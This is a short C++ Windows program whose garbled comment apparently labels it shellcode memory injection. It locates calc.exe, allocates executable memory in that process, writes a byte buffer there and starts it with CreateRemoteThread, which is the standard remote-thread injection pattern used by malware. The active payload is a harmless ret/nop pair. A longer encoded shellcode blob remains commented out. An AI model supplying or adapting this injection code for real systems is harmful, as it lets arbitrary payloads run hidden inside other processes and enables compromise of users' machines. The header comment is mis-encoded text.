
/*
ÄÚ´æ×¢Èë.×¢ÈëShellCode


*/
#pragma once

#include <windows.h>
#include <stdlib.h>
#include <tchar.h>
#include "CTerminateProcess.h"
int _tmain(_In_ int argc, _In_reads_(argc) _Pre_z_ _TCHAR** argv, _In_z_ char** envp)
{

    LPVOID lpBuffer = NULL;
    HANDLE hProcess = NULL;
    DWORD dwWriteBytes = 0;
    CTerminateProcess CterPro;
    DWORD dwPid = 0;
    CterPro.GetProcessPidByName(TEXT("calc.exe"),dwPid,NULL);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
   
  /*  unsigned char shellcode_calc[] =
        "\xb8\x82\x0a\x8d\x38\xd9\xc6\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x23"
        "\x31\x42\x12\x83\xea\xfc\x03\xc0\x04\x6f\xcd\x38\xf0\x2b\x2e\xc0"
        "\x01\x3f\x6b\xfc\x8a\x43\x71\x84\x8d\x54\xf2\x3b\x96\x21\x5a\xe3"
        "\xa7\xde\x2c\x68\x93\xab\xae\x80\xed\x6b\x29\xf0\x8a\xac\x3e\x0f"
        "\x52\xe6\xb2\x0e\x96\x1c\x38\x2b\x42\xc7\xc5\x3e\x8f\x8c\x99\xe4"
        "\x4e\x78\x43\x6f\x5c\x35\x07\x30\x41\xc8\xfc\x45\x65\x41\x03\xb2"
        "\x1f\x09\x20\x40\xe3\x83\xe8\x2c\x68\xa3\xd8\x29\xae\x5c\x15\xba"
        "\x6f\x91\xae\xcc\x73\x04\x3b\x44\x84\xbd\x35\x1f\x14\xf1\x46\x1f"
        "\x15\x79\x2e\x23\x4a\x4c\x59\x3b\x22\x27\x5d\x38\x0a\x4c\xce\x56"
        "\xf5\x6b\x0c\xd5\x61\x14\x2f\x93\x7c\x73\x2f\x44\xe3\x1a\xa3\xe9"
        "\xe4";*/
    if (NULL == hProcess)
        return FALSE;
    unsigned char shellcode_calc[] = "\xc3\x90";
    lpBuffer = VirtualAllocEx(hProcess, 0, 0x1000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (NULL == lpBuffer)
        return FALSE;

   

    WriteProcessMemory(hProcess, lpBuffer, shellcode_calc, sizeof(shellcode_calc)/sizeof(shellcode_calc[0]), &dwWriteBytes);
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBuffer, 0, 0, 0);
}